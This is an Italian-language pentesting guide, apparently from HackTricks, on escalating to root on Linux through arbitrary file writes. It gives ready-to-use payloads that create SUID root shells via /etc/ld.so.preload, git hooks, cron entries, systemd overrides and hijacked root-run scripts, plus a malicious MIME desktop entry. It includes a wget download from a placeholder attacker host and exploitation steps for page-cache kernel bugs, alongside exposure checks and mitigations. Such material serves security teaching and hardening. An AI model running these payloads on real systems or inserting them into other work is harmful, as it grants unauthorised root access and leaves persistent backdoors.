# Scrittura arbitraria di file come root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` è un elenco a livello di sistema di oggetti condivisi che il linker dinamico carica prima degli altri oggetti condivisi. La modalità di esecuzione sicura applica restrizioni aggiuntive al preloading, quindi un percorso di libreria come `/tmp/pe.so` non è una tecnica universale per i binari SUID.\
Se puoi creare o modificare questo file, un processo che lo carica caricherà la libreria elencata prima degli altri oggetti condivisi, consentendo l'esecuzione di codice nel contesto di quel processo.<sup>[[12]](#references)</sup>

Ad esempio: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

I **Git hooks** sono script eseguibili eseguiti in occasione di eventi all'interno di un repository, incluse le operazioni di commit e merge. Se uno **script o un utente privilegiato** esegue tali azioni e un attaccante può **scrivere nella cartella `.git`**, l'hook può essere utilizzato per la **privilege escalation**.<sup>[[13]](#references)</sup>

Ad esempio, è possibile **generare uno script** in un git repo nella directory **`.git/hooks`**, in modo che venga sempre eseguito quando viene creato un nuovo commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### File Cron e temporali

Se puoi **scrivere file relativi a cron che root esegue**, di solito puoi ottenere l'esecuzione di codice alla successiva esecuzione del job. Tra i target interessanti ci sono:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Il crontab di root in `/var/spool/cron/` o `/var/spool/cron/crontabs/`
- I timer `systemd` e i servizi che attivano

Controlli rapidi:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Percorsi tipici di abuso:

- **Aggiungere un nuovo cron job root** a `/etc/crontab` o a un file in `/etc/cron.d/`
- **Sostituire uno script** già eseguito da `run-parts`
- **Inserire una backdoor nel target di un timer esistente** modificando lo script o il binario che avvia

Esempio minimale di payload cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Se puoi scrivere solo all'interno di una directory cron utilizzata da `run-parts`, inserisci invece lì un file eseguibile:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Note:

- `run-parts` di solito ignora i nomi di file contenenti punti, quindi preferisci nomi come `backup` invece di `backup.sh`.<sup>[[15]](#references)</sup>
- Alcuni sistemi usano i timer `systemd` invece del cron classico, ma l'idea dell'abuse è la stessa: **modificare ciò che root eseguirà in seguito**.<sup>[[20]](#references)</sup>

### File di Service e Socket

Se puoi scrivere **file unit di `systemd`** o i file da essi referenziati, potresti riuscire a ottenere code execution come root ricaricando e riavviando la unit, oppure aspettando che si attivi il percorso di service/socket activation.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

I target interessanti includono:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Override drop-in in `/etc/systemd/system/<unit>.d/*.conf`
- Script/binari di service referenziati da `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Percorsi `EnvironmentFile=` scrivibili caricati da un service root

Controlli rapidi:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Percorsi comuni di abuso:

- **Sovrascrivere `ExecStart=`** in una service unit di proprietà di root che puoi modificare
- **Aggiungere un drop-in override** con un `ExecStart=` malevolo e cancellare prima quello precedente
- **Inserire una backdoor nello script/binario** già referenziato dalla unit
- **Hijackare un servizio attivato da socket** modificando il file `.service` corrispondente, che viene avviato quando il socket riceve una connessione

Esempio di override malevolo:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flusso di attivazione tipico:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Se non puoi riavviare personalmente i servizi ma puoi modificare un'unità attivata tramite socket, potrebbe essere sufficiente **attendere una connessione client** per attivare l'esecuzione del servizio con backdoor come root.<sup>[[17]](#references)</sup>

### Sovrascrivere un `php.ini` restrittivo utilizzato da una sandbox PHP privilegiata

Alcuni daemon personalizzati convalidano il PHP fornito dall'utente eseguendo `php` con un **`php.ini` restrittivo** (ad esempio, `disable_functions=exec,system,...`). Se il codice nella sandbox dispone ancora di **qualunque primitiva di scrittura** (come `file_put_contents`) e puoi raggiungere il **percorso esatto del `php.ini`** utilizzato dal daemon, puoi **sovrascrivere tale configurazione** per rimuovere le restrizioni e quindi inviare un secondo payload che viene eseguito con privilegi elevati.<sup>[[2]](#references)</sup>

Flusso tipico:

1. Il primo payload sovrascrive la configurazione della sandbox.
2. Il secondo payload esegue il codice ora che le funzioni pericolose sono state riabilitate.

Esempio minimo (sostituisci il percorso utilizzato dal daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Se il daemon viene eseguito come root (o esegue la validazione utilizzando percorsi di proprietà di root), la seconda esecuzione restituisce un contesto root. Si tratta essenzialmente di una **privilege escalation tramite sovrascrittura della configurazione** quando il runtime in sandbox può ancora scrivere file.

### binfmt_misc

`binfmt_misc` espone le registrazioni in `/proc/sys/fs/binfmt_misc`; ogni registrazione associa un pattern di tipo file a un interpreter. L'impatto sui privilegi dipende da chi può modificare la registrazione e da quale processo esegue successivamente il file corrispondente; pertanto, verifica questi requisiti prima di considerarlo un possibile percorso di privilege escalation.<sup>[[21]](#references)</sup>

### Sovrascrivere i gestori degli schemi (come http: o https:)

Gli ambienti desktop utilizzano associazioni MIME e desktop entry per scegliere un'applicazione per gli schemi URI; un attacker che può scrivere nella configurazione per-user e nelle directory delle desktop entry interessate può reindirizzare tali schemi verso un launcher sotto il suo controllo. Modificando il file `$HOME/.config/mimeapps.list` per impostare i gestori degli URL HTTP e HTTPS su un file malevolo (ad esempio, `x-scheme-handler/http=evil.desktop` e `x-scheme-handler/https=evil.desktop`), un clic dell'utente può invocare quella desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root che esegue script/binari modificabili dall'utente

Se un workflow privilegiato esegue qualcosa come `/bin/sh /home/username/.../script` (o qualsiasi binario all'interno di una directory di proprietà di un utente non privilegiato), puoi dirottarlo:<sup>[[1]](#references)</sup>

- **Rileva l'esecuzione:** monitora i processi con pspy per intercettare root quando invoca percorsi controllati dall'utente.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Conferma la scrivibilità:** assicurati che sia il file di destinazione sia la sua directory siano di proprietà del tuo utente e scrivibili.
- **Hijack del target:** esegui il backup del binary/script originale e inserisci un payload che crei una shell SUID (o qualsiasi altra azione root), quindi ripristina i permessi:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Attiva l'azione privilegiata** (ad esempio, premendo un pulsante UI che avvia l'helper). Quando root riesegue il path hijacked, ottieni la shell escalated con `./rootshell -p`.

### Modifica dei file limitata alla page cache dei binari privilegiati

Alcuni bug del kernel non modificano il file **su disco**. Al contrario, consentono di modificare solo la **copia nella page cache** di un file leggibile. Se puoi indirizzare un binario **setuid** o comunque **eseguito da root**, l'esecuzione successiva potrebbe eseguire byte controllati dall'attacker presenti in memoria ed effettuare privilege escalation, anche se l'hash del file su disco non è cambiato.<sup>[[3]](#references)[[4]](#references)</sup>

È utile considerare questa situazione come una **primitiva di scrittura del file limitata al runtime**:<sup>[[3]](#references)</sup>

- **Il disco resta pulito**: l'inode e i byte su disco non cambiano
- **La memoria è dirty**: i processi che leggono o eseguono la pagina in cache ricevono il contenuto modificato dall'attacker
- **L'effetto è temporaneo**: la modifica scompare dopo un reboot o l'eviction dalla cache

Questa primitiva si colloca tra la classica **arbitrary file write** e i vecchi bug di **page-cache abuse** come Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW si basava su una race
- Dirty Pipe aveva vincoli sulla posizione di scrittura
- Una primitiva limitata alla page cache può essere più affidabile se il path vulnerabile consente scritture dirette nelle pagine cached file-backed

#### Flusso generico di privesc

1. Ottieni una primitiva del kernel in grado di scrivere nelle **pagine della page cache file-backed**
2. Usala contro un **binario privilegiato leggibile** o un altro file eseguito da root
3. Attiva l'esecuzione **prima** che la pagina venga evicted dalla cache
4. Ottieni code execution come root mentre il file su disco appare ancora non modificato

Target tipici ad alto valore:

- Binari **setuid-root**
- Helper avviati da **servizi root**
- Binari eseguiti comunemente da **container che condividono il kernel/page cache dell'host**

#### Path di esempio AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) è un buon esempio di questa classe. Il path vulnerabile si trovava nella userspace API crittografica di Linux (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` può spostare riferimenti a pagine della page cache da un file leggibile nella scatterlist TX della crypto
- il path di decrypt in-place di `algif_aead` riutilizzava i buffer sorgente e destinazione
- `authencesn` scriveva quindi nella regione del tag di destinazione
- quando quella regione faceva ancora riferimento a pagine file-backed ottenute tramite splice, la scrittura finiva nella **page cache del file target**

La tecnica interessante, quindi, non è il CVE in sé, ma il pattern:

- **inserire pagine cached file-backed in un sottosistema del kernel**
- fare in modo che il sottosistema le **tratti come output scrivibile**
- attivare un overwrite controllato di piccole dimensioni in memoria

Il PoC pubblico utilizzava **scritture ripetute di 4 byte** per modificare `/usr/bin/su` in memoria e quindi eseguirlo.<sup>[[4]](#references)[[7]](#references)</sup>

#### Path di esempio ESP / XFRM + clone netfilter TEE

DirtyClone (CVE-2026-43503) mostra un'altra variante dello stesso pattern di **page-cache-only write-to-root**, ma questa volta il sink è il **decrypt IPsec ESP** invece di `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

La tecnica importante è il passaggio di **metadata laundering**:

- `splice()` inserisce una **pagina read-only file-backed della page cache** in un pacchetto ESP-in-UDP
- la mitigazione originale di DirtyFrag contrassegnava quello skb con `SKBFL_SHARED_FRAG`, in modo che `esp_input()` eseguisse una **copia prima del decrypt**
- netfilter `TEE` duplica il pacchetto tramite `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- il clone conserva lo **stesso riferimento fisico alla pagina della page cache**, ma perde `SKBFL_SHARED_FRAG`
- `esp_input()` considera quindi il clone sicuro ed esegue il decrypt **in-place `cbc(aes)`** sulla pagina file-backed

La lezione per il reviewer è più ampia del CVE: se una mitigazione dipende dai **metadata di skb/pagina** per decidere se un'operazione debba prima eseguire una copia, qualsiasi **path di clone/copia che preservi la pagina sottostante ma elimini i metadata** può riaprire silenziosamente la primitiva di scrittura.

Flusso di exploitation tipico:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` per ottenere **`CAP_NET_ADMIN` all'interno di un network namespace privato**
2. attiva il loopback e installa una **regola netfilter `TEE`** in `mangle/OUTPUT`
3. installa le SA di trasporto XFRM ESP tramite `NETLINK_XFRM`
4. codifica ogni word target di 4 byte nel campo `seq_hi` della SA (il word-selection trick di DirtyFrag)
5. invia il pacchetto ESP-in-UDP ottenuto tramite splice, in modo che il **clone TEE** raggiunga `esp_input()` ed esegua il decrypt **in-place**
6. ripeti finché la copia nella page cache di `/usr/bin/su` o di un altro eseguibile privilegiato contiene codice controllato dall'attacker

Dal punto di vista operativo, l'impatto è lo stesso dell'esempio `AF_ALG`: il file su disco resta pulito, ma `execve()` utilizza i **byte modificati della page cache** e restituisce root.<sup>[[8]](#references)[[9]](#references)</sup>

Controlli utili sull'esposizione per questa variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
La riduzione a breve termine della attack surface è specifica anche al percorso: l'aggiornamento a un kernel che include `48f6a5356a33` corregge il clone path, mentre il blocco dell'autoload di `xt_TEE` rimuove il **flag-laundering step** e il blocco di `esp4` / `esp6` rimuove il **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Esposizione e ricerca

Se sospetti questa classe di bug, non affidarti solo ai controlli di integrità del disco. Verifica anche:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
I valori di configurazione riportati di seguito distinguono un'interfaccia caricabile da una integrata nel kernel; le regole di build crypto associano `CONFIG_CRYPTO_USER_API_AEAD` a `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` può essere caricato/scaricato come modulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: l'interfaccia è integrata nel kernel
- i binari setuid sono buoni target perché una patch che agisce solo sulla page cache può essere sufficiente per trasformare un accesso locale in root

#### Riduzione della superficie d'attacco per il percorso `algif_aead`

Se l'interfaccia vulnerabile è fornita da un modulo caricabile:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Se è compilato nel kernel, alcune disclosure hanno segnalato il blocco del percorso init con:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Questo tipo di mitigazione è utile da ricordare anche per altri kernel LPE: se lo sfruttamento dipende da una specifica interfaccia opzionale, disabilitare o mettere in blacklist quell’interfaccia può interrompere il percorso di exploit anche prima che sia disponibile un aggiornamento completo del kernel.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – hijacking di uno script eseguito da root in una directory PaperCut scrivibile dall’utente](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: FAQ su Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Divulgazione di Openwall oss-security per CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Fix Linux stable: crypto: algif_aead - ripristino del funzionamento out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory CVE-2026-31431](https://copy.fail/)
- [7] [Analisi tecnica di Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repository / README di DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analisi e sfruttamento della variante Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Fix Linux: net: skb: preservare `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigazione Linux precedente: impostare `SKBFL_SHARED_FRAG` per i pacchetti UDP sottoposti a splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — pagina del manuale Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — pagina del manuale Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — documentazione del Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Associazioni delle applicazioni MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Specifiche Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Specifiche Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Linguaggio Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile della crittografia Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: vulnerabilità della page cache di AF_ALG nel Linux kernel](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — pagina del manuale Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
